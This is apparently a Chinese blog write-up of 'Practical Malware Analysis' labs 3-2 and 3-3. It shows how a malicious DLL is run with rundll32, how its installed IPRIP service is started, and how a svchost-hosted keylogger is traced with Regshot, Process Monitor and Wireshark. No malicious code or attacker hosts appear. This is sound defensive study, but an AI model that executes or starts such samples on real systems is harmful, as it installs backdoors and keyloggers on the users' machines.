        <content type="html"><![CDATA[<h3 id="Lab03-02"><a href="#Lab03-02" class="headerlink" title="Lab03-02"></a>Lab03-02</h3><p>该例实验要求我们进行dll文件的运行，过往的学习中尚未见过要求单独运行dll的样例，特此记录。</p><p>首先准备实验所需工具（Regshot，Process Explorer，Process Monitor）</p><p>运行dll文件的指令很简单</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ rundll32 <span class="token operator">&lt;</span>DLL路径<span class="token operator">></span>,<span class="token operator">&lt;</span>函数名称<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但记住，此时我们应该使用Regshot工具记录注册表键值，便于一会进行快照的比较</p><p>运行完毕命令以后，进行第二次的快照拍摄，同时进行快照比较，比较后的报告如下图所示：</p><p><img src="/2025/11/19/e-yi-dai-ma-fen-xi-shi-zhan-lab3/1763625273515.png" alt="Regshot 结果"></p><p>可以看出，该dll程序新添了服务项IPRIP，接下来我们便启动这个服务项，</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net start IPRIP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到，la03-02.dll是附着在svchost.exe这个宿主程序上运行的，并且通过PID查找可看到这个程序对系统进行的操作：</p><p><img src="/2025/11/19/e-yi-dai-ma-fen-xi-shi-zhan-lab3/1763625939434.png" alt="查询结果"></p><p>同时使用wireshark抓包，分析网络流量，可以看到可疑的网址和http请求，该文件至此分析完毕：</p><p><img src="/2025/11/19/e-yi-dai-ma-fen-xi-shi-zhan-lab3/1763626430961.png"></p><p><img src="/2025/11/19/e-yi-dai-ma-fen-xi-shi-zhan-lab3/1763626437351.png" alt="分析流量"></p><h3 id="Lab03-03："><a href="#Lab03-03：" class="headerlink" title="Lab03-03："></a>Lab03-03：</h3><p>该程序是一个记录键盘输入的恶意代码，我们一步步对其进行分析</p><p>首先使用Process Exploer观测该程序运行的操作，发现他在创建了一个孤儿进程后自行退出，那么我们仔细观察这个被创建的svchost进程中的字符串信息：</p><p><img src="/2025/11/19/e-yi-dai-ma-fen-xi-shi-zhan-lab3/1763627864079.png" alt="Strings"></p><p>可以发现有大量的键盘字符，初步猜测其目的是记录键盘输入；接下来我们再根据Exploer中找到的PID，在Process Monitor中进行操作查询：</p><p><img src="/2025/11/19/e-yi-dai-ma-fen-xi-shi-zhan-lab3/1763627968227.png" alt="Process EX &amp; Mon"></p><p>发现该程序正在大量的对一个文件进行读写，打开此文件：</p><p><img src="/2025/11/19/e-yi-dai-ma-fen-xi-shi-zhan-lab3/1763628029435.png" alt="结果"></p><p>看到记录着我在哪一程序上输入了哪些信息。</p><p>至此，该恶意代码功能分析完毕</p>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 恶意代码分析实战 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
